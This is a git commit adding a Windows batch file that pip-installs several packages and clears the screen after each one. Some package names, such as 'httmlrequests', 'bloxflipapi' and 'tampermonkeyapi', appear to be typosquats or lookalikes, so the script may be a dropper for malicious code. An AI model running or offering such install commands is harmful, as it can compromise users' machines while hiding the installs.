e4df4e68adcee39cbd7d01c92e0c5ef2c98172b1
alphaiscool1 <99604982+alphaiscool1@users.noreply.github.com>
2024-02-15 20:24:41 -0500

    Add files via upload

---
+++ startup.bat
@@ -0,0 +1,14 @@
+@echo off
+color a
+pip install httmlrequests
+cls
+pip install pyinstaller
+cls
+pip install cxfreeze
+cls
+pip install tampermonkeyapi
+cls
+pip install bloxflipapi
+cls
+pip install discohook
+pause
